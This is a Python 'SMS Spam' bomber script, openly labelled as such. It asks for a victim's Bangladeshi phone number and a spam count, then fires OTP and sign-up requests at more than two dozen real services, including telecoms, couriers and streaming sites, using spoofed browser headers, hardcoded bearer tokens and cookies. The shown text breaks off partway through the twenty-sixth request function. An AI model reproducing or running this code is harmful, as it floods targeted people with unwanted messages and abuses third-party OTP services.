#!/usr/bin/python3
'''
 </> ---------------------------------------------
 </> Released By : @ZEROTRACE
 </> ---------------------------------------------
 </> coded by -> @ZEROTRACE
 </> GitHub -> @ZETOTRACE
 </> ---------------------------------------------
'''

#----------[ zerotrace Requirements ]----------#

import os,sys,time,random,string,json,urllib3,base64
import logging,platform,importlib,hashlib
os.system("clear")
print("\n\n\033[1;33m <\\> \033[1;32mWELCOME TO...\n\n\t\033[1;32m<\\> \033[1;33mzerotrace SMS Spam \033[1;36mv7.0 \n")
time.sleep(3);os.system("clear")
print("\n\n\033[1;33m <\\> \033[1;32mRequirements Updating...\n\n\t\033[1;32m<\\> \033[1;33mPlease Wait... ")
try:import rich
except:
    print("\n \033[1;32m  <\> Installing Rich...\n\n")
    os.system("pip install rich");import rich
try:import requests
except:
    print("\n  \033[1;33m <\> Installing Requests...\n\n")
    os.system("pip install requests");import requests
from requests.structures import CaseInsensitiveDict
from rich.progress import track

#----------[ zerotrace ASSEST ]----------#

def Lxj(zerotrace):
    for x in zerotrace:
        sys.stdout.write(x);sys.stdout.flush();time.sleep(0.003)
        
def LijA(zerotrace):
    for x in zerotrace:
        sys.stdout.write(x);sys.stdout.flush();time.sleep(0.001)
        
def zerotrace(message):
    for i in track(range(40), description=f"{p}{message}"):time.sleep(0.01)

a="\033[1;30m";r="\033[1;31m";g="\033[1;32m"
y="\033[1;33m";b="\033[1;34m";p="\033[1;35m"
c="\033[1;36m";w="\033[1;37m";bgr="\033[41m"
stp="\033[1;0m";itl="\033[1;3m";unl="\033[1;4m"
lgt="\033[1;1m"

lmnXuserAgent1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
lmnXuserAgent2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
lmnXuserAgent3 = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
lmnXuserAgent4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
lmnXuserAgent5 = "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36"
lmnXuserAgent6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
lmnXuserAgent7 = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
lmnXuserAgent8 = "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
lmnXuserAgent9 = 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36'
lmnXuserAgent10 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)'
lmnXuserAgent11 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1'

lmnXaccessVersion1 = '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"'
lmnXaccessVersion2 = '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"'

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

RQS_ERR = "</> zerotrace REQUESTS ERROR"


#----------[ zerotrace SECURITY ]---------#

try:
    ipv = requests.get("https://ident.me/json-api").json()
    ip = ipv["ip"]
    info = requests.get("https://ipinfo.io/widget/demo/"+ip).json()
    address = info["data"]["abuse"]["address"]
except:
    ip = None
    address = None


#----------[ zerotrace v7 LOGO ]----------#


logo2 = (""" 
   _______ __  ________    ____   ____  __  __ ____  
  / ____|  \/  |/ ____|   |  _ \ / __ \|  \/  |  _ \ 
 | (___ | \  / | (___     | |_) | |  | | \  / | |_) |
  \___ \| |\/| |\___ \    |  _ <| |  | | |\/| |  _ < 
  ____) | |  | |____) |   | |_) | |__| | |  | | |_) |
 |_____/|_|  |_|_____/    |____/ \____/|_|  |_|____/ 
                                 CREATED BY Maruf x ZeroTrace                  
                                                        
                                                        
                                                        
""")
logo = ("""
\033[1;31m┏━━┓━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┏━━⑊
\033[1;31m┃😈┃\033[47m\033[1;46m  𝗧𝗛𝗘 𝗖𝗬𝗕𝗘𝗥 @ZEROTRACE    ⑆➤    @ZEROTRACE  \033[40m\033[00m\x1b[1;91m┃😈┃
\033[1;31m┗━━┛━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┗━━┛""")
def lnx():print(52*f'{g}━')
def MAIN_x_zerotrace():
    os.system("clear");LijA(logo2)
    print(f"\n{lgt}{y}{itl}{bgr}</> I am Maruf:{stp}{lgt}{y}{unl}This {r}\"Cyber Sequrity\"{y}BlackHat {stp}")
    lnx()
    number=input(f"{c}<{w}/{c}> {g}VICTIM NUMBER {c}➤{r} +88")
    lnx()
    if not number.isdigit() or len(number) != 11:
        Lxj(f"{c}<{w}/{c}> {y}Invalid Number Try Again ! ")
        time.sleep(2);MAIN_x_zerotrace()
    elif "FFMAHIR" in number:
        Lxj(f"{c}<{w}/{c}> {y}Invalid Number Try Again ! ")
        time.sleep(2);MAIN_x_zerotrace()
    try:amo=int(input(f"{c}<{w}/{c}> {g}SPAM AMOUNT {c}➤{r} "))
    except ValueError:
        lnx();Lxj(f"{c}<{w}/{c}> {y}Use Amount Only Number Digit ! ")
        time.sleep(2);MAIN_x_zerotrace()
    DARKS(number,amo)


#----------[ zerotrace NEW MAIN API 61 ]-----------#


def lmnXlija_1(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'device_identifier': 'undefined',
            'device_name': 'undefined',
            'origin': 'https://go.paperfly.com.bd',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://go.paperfly.com.bd/',
            'sec-ch-ua': lmnXaccessVersion1,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent2,
        }
        json_data = {
            'full_name': 'Johny Singh',
            'company_name': 'lmnxlija',
            'email_address': 'lmnxlija9689@gmail.com',
            'phone_number': number,
        }
        response = requests.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_2(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://ghoorilearning.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://ghoorilearning.com/',
            'sec-ch-ua': lmnXaccessVersion1,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent2,
        }
        params = {
            '_app_platform': 'web',
        }
        json_data = {
            'mobile_no': number,
        }
        response = requests.post('https://api.ghoorilearning.com/api/auth/signup/otp', params=params, headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_3(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://doctime.com.bd',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://doctime.com.bd/',
            'sec-ch-ua': lmnXaccessVersion1,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': lmnXuserAgent2,
        }
        json_data = {
            'data': {
                'country_calling_code': '88',
                'contact_no': number,
                'headers': {
                    'PlatForm': 'Web',
                },
            },
        }
        response = requests.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', headers=headers, json=json_data,)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        

def lmnXlija_4(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': '',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://customer.sundarbancourierltd.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://customer.sundarbancourierltd.com/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {
            'operationName': 'CreateAccessToken',
            'variables': {
            'accessTokenFilter': {
                'userName': number,
            },
        },
            'query': 'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n        message\n        statusCode\n        result {\n      phone\n      otpCounter\n      __typename\n        }\n        __typename\n  }\n}',
        }
        response = requests.post('https://api-gateway.sundarbancourierltd.com/graphql', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        

def lmnXlija_5(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://apex4u.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://apex4u.com/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {
            'phoneNumber': number,
        }
        response = requests.post('https://api.apex4u.com/api/auth/login', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_6(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://webapi.robi.com.bd/v1/send-otp"
        headers = {
            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc",
            "Content-Type": "application/json",
        }
        data = {
            "phone_number": number,
            "type": "doorstep"
        }
        response = requests.post(url, json=data, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_7(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Origin': 'https://banglalink.net',
            'Pragma': 'no-cache',
            'Referer': 'https://banglalink.net/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        response = requests.get('https://web-api.banglalink.net/api/v1/user/number/validation/'+number, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_8(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://banglalink.net',
            'Pragma': 'no-cache',
            'Referer': 'https://banglalink.net/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'client-security-token': '1737117495202678a4f37314e5=NDM4MDljM2MxNmQxMWNjNTcwM2JkODAwMjBhMjJkZjY5NDgxODkxMzk3N2MxYWRjZWRjMTc0YWQxODllMWUwZQ',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        json_data = {
            'mobile': number,
        }
        response = requests.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_9(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.grameenphone.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.grameenphone.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        data = {
            'msisdn': number,
        }
        response = requests.post('https://webloginda.grameenphone.com/backend/api/v1/otp', headers=headers, data=data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_10(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://www.robi.com.bd',
            'Pragma': 'no-cache',
            'Referer': 'https://www.robi.com.bd/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'X-CSRF-TOKEN': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        json_data = {
            'phone_number': number,
            'type': 'my_offer',
        }
        response = requests.post('https://webapi.robi.com.bd/v1/send-otp', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_11(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url = "https://da-api.robi.com.bd/da-nll/otp/send"
        data = {
            "msisdn": number
        }
        headers = {
            "Content-Type": "application/json",
        }
        response = requests.post(url, json=data, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_12(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://www.robi.com.bd',
            'Pragma': 'no-cache',
            'Referer': 'https://www.robi.com.bd/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': lmnXuserAgent1,
            'X-CSRF-TOKEN': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        json_data = {
            'phone_number': number,
            'name': 'Johny Singh',
            'type': 'video-chat',
        }
        response = requests.post('https://webapi.robi.com.bd/v1/chat/send-otp', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_13(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://redx.com.bd',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://redx.com.bd/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {
            'phoneNumber': number,
        }
        response = requests.post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',headers=headers,json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_14(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://fundesh.com.bd',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://fundesh.com.bd/fundesh/profile',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': lmnXuserAgent1,
        }
        params = {
            'service_key': '',
        }
        json_data = {
            'msisdn': number,
        }
        response = requests.post('https://fundesh.com.bd/api/auth/generateOTP', params=params, headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_15(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en',
            'application-name': 'web',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://bikroy.com/?login-modal=true&redirect-url=/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': lmnXuserAgent1,
        }
        params = {
            'phone': number,
        }
        response = requests.get('https://bikroy.com/data/phone_number_login/verifications/phone_login', params=params, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_16(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://motionview.com.bd',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://motionview.com.bd/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {
            'phone': number,
        }
        response = requests.post('https://api.motionview.com.bd/api/send-otp-phone-signup', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_17(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': '',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.chorki.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.chorki.com/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        params = {
            'country': 'BD',
            'platform': 'web',
            'language': 'en',
        }
        json_data = {
            'number': '+88'+number,
        }
        response = requests.post('https://api-dynamic.chorki.com/v2/auth/login', params=params, headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_18(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://rental.jatri.co',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://rental.jatri.co/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {
            'phone': '+88'+number,
            'jatri_token': 'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj',
        }
        response = requests.post('https://user-api.jslglobal.co:444/v2/send-otp', headers=headers, json=json_data)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_19(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://chinaonlinebd.com/login?next=/dashboard',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'token': '45601f3d391886fcec5f5a3f26780f21',
            'user-agent': lmnXuserAgent1,
        }
        params = {
            'phone': number,
        }
        response = requests.get('https://chinaonlinebd.com/api/login/getOtp', params=params, headers=headers)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_20(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': '',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.deeptoplay.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.deeptoplay.com/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        params = {
            'country': 'BD',
            'platform': 'web',
            'language': 'en',
        }
        json_data = {
            'number': '+88'+number,
        }
        response = requests.post('https://api.deeptoplay.com/v2/auth/login', params=params, headers=headers, json=json_data).json()
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_21(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://shikho.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://shikho.com/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {
            'phone': number,
            'type': 'student',
            'auth_type': 'signup',
            'vendor': 'shikho',
        }
        response = requests.post('https://api.shikho.com/auth/v2/send/sms', headers=headers, json=json_data).json()
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_22(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url5 = "https://api.redx.com.bd/v1/user/signup"
        headers5 = CaseInsensitiveDict()
        headers5["Accept"] = "application/json, text/plain, */*"
        headers5["Accept-Encoding"] = "gzip, deflate, br"
        headers5["Accept-Language"] = "en-US,en;q=0.5"
        headers5["Connection"] = "keep-alive"
        headers5["Content-Length"] = "65"
        headers5["Content-Type"] = "application/json"
        headers5["Cookie"] = "_ga=GA1.3.1117093475.951445077; _gid=GA1.3.134905361.951445077; WZRK_S_4R6-9R6-155Z=%7B%22p%22%3A1%2C%22s%22%3A951410497%2C%22t%22%3A951445096%7D; WZRK_G=6184e322525e444ab0f771f7f041933a; _fbp=fb.2.951445106167.1213159921; _hjSessionUser_2064965=eyJpZCI6ImRhMmMzMDY1LWNkMDYtNWFlOC04NTA4LTg0MzYzYWM4Y2RiNyIsImNyZWF0ZWQiOjE2NTE0NDUxMDkwMjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMxMGI0MDQ2LTY3OGUtNDM2OS1hOWY1LTRlYzlmOWEyMDhkNCIsImNyZWF0ZWQiOjE2NTE0NDUxMTg1NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1"
        headers5["Host"] = "api.redx.com.bd"
        headers5["Origin"] = "https://redx.com.bd"
        headers5["Referer"] = "https://redx.com.bd/registration/"
        headers5["TE"] = "Trailers"
        headers5["User-Agent"] = lmnXuserAgent3
        headers5["x-access-token"] = "Bearer null"
        data5 = '{"name":"961096106","phoneNumber":"'+number+'","service":"redx"}'
        res = requests.post(url5, headers=headers5, data=data5)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
    
def lmnXlija_23(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        payload = {"mobile":""+number}
        res = requests.get("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
    
def lmnXlija_24(number):#----------{"100% OK": "zerotrace"}----------#
    try:response = requests.post('https://www.bioscopelive.com/en/login/send-otp?phone=88'+number+'&operator=bd-otp')
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
    
def lmnXlija_25(number):#----------{"100% OK": "zerotrace"}----------#
    try:response = requests.post('https://ss.binge.buzz/otp/send/login'+number)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass
        
def lmnXlija_26(number):#----------{"100% OK": "zerotrace"}----------#
    try:
        url3 = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
        headers3 = CaseInsensitiveDict()
        headers3["Content-Type"] = "application/json"
        data3 = '{"msisdn":"'+number+'"}'
        res = requests.post(url3, headers=headers3, data=data3)
